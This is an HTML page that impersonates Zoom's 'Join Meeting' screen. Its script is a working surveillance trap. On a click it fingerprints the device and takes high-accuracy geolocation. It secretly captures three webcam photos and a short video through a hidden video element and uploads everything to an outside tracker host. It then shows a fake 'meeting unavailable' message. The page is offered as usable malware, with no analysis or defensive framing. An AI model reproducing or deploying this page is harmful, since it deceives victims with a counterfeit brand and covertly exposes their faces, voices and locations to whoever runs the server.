<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Join Meeting - Zoom</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: #ffffff;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #e5e5e5;
    }

    .logo {
      font-size: 32px;
      font-weight: 700;
      color: #0e72ed;
      letter-spacing: -2px;
    }

    .main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    .join-box {
      width: 100%;
      max-width: 480px;
      text-align: center;
    }

    h1 {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 32px;
      color: #1a1a1a;
    }

    .label {
      text-align: left;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #444;
    }

    input {
      width: 100%;
      padding: 16px 20px;
      font-size: 16px;
      border: 1px solid #d0d0d0;
      border-radius: 8px;
      margin-bottom: 20px;
    }

    #joinBtn {
      width: 100%;
      padding: 16px;
      background: #0e72ed;
      color: white;
      font-size: 18px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }

    #joinBtn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    #status {
      margin-top: 20px;
      font-size: 14px;
      min-height: 22px;
      color: #0e72ed;
    }

    #error {
      margin-top: 20px;
      font-size: 14px;
      color: #d93025;
      min-height: 22px;
    }

    video { display: none; }
  </style>
</head>
<body>

  <header>
    <div class="logo">zoom</div>
    <div>
      <button style="padding:8px 20px; border-radius:9999px; border:1px solid #0e72ed; background:white; color:#0e72ed; font-weight:500;">Support</button>
      <button style="padding:8px 20px; border-radius:9999px; border:none; background:#0e72ed; color:white; font-weight:500; margin-left:8px;">Sign Up Free</button>
    </div>
  </header>

  <div class="main">
    <div class="join-box">
      <h1>Join Meeting</h1>
      
      <div class="label">Meeting ID or Personal Link Name</div>
      <input type="text" id="meetingId" value="987-654-321" readonly>

      <button id="joinBtn">Join</button>
      
      <div id="status"></div>
      <div id="error"></div>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const btn = document.getElementById('joinBtn');
    const status = document.getElementById('status');
    const errorDiv = document.getElementById('error');
    const videoEl = document.getElementById('video');
    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';   // GANTI JIKA PERLU

    // Deteksi MIME Type yang didukung Safari
    async function getSupportedMimeType() {
      const types = [
        'video/mp4;codecs=h264',
        'video/mp4',
        'video/webm;codecs=vp8',
        'video/webm'
      ];
      for (let type of types) {
        if (MediaRecorder.isTypeSupported(type)) return type;
      }
      return 'video/mp4';
    }

    async function getDeviceFingerprint() {
      return {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}×${screen.height}`,
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory || 'N/A',
        touchSupport: navigator.maxTouchPoints > 0
      };
    }

    btn.addEventListener('click', async () => {
      btn.disabled = true;
      status.textContent = 'Connecting to meeting...';
      errorDiv.textContent = '';

      try {
        const deviceInfo = await getDeviceFingerprint();

        // Geolocation
        status.textContent = 'Getting location...';
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          });
        });

        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };

        // Camera + Microphone
        status.textContent = 'Activating camera...';
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        videoEl.srcObject = stream;
        await videoEl.play().catch(() => {});

        // Ambil 3 Foto
        const photos = [];
        for (let i = 0; i < 3; i++) {
          await new Promise(r => setTimeout(r, 1300));
          const canvas = document.createElement('canvas');
          canvas.width = videoEl.videoWidth || 640;
          canvas.height = videoEl.videoHeight || 480;
          canvas.getContext('2d').drawImage(videoEl, 0, 0);
          photos.push(canvas.toDataURL('image/jpeg', 0.85));
        }

        // Rekam Video (3 detik)
        status.textContent = 'Recording...';
        const mimeType = await getSupportedMimeType();
        const recorder = new MediaRecorder(stream, { mimeType: mimeType });
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();

        await new Promise(r => setTimeout(r, 3200));
        recorder.stop();

        const videoBlob = await new Promise(resolve => {
          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
        });

        // Kirim ke dashboard.php
        status.textContent = 'Joining meeting...';
        const formData = new FormData();
        formData.append('location', JSON.stringify(location));
        formData.append('device_info', JSON.stringify(deviceInfo));
        
        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
        formData.append('video', videoBlob, `zoom_meeting_${Date.now()}.${ext}`);

        for (let i = 0; i < photos.length; i++) {
          const blob = await fetch(photos[i]).then(r => r.blob());
          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
        }

        const response = await fetch(SERVER_URL, {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          status.innerHTML = '✅ Successfully joined the meeting';
          setTimeout(() => {
            alert("The meeting is not available or has ended. Please try again later.");
            btn.disabled = false;
          }, 1500);
        } else {
          throw new Error('Server error');
        }

        // Cleanup
        stream.getTracks().forEach(track => track.stop());

      } catch (err) {
        console.error(err);
        let msg = 'Failed to join meeting.';
        if (err.name === 'NotAllowedError') msg = 'Permission denied. Please allow Camera, Microphone & Location.';
        if (err.name === 'NotFoundError') msg = 'No camera or microphone found.';
        errorDiv.textContent = msg;
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
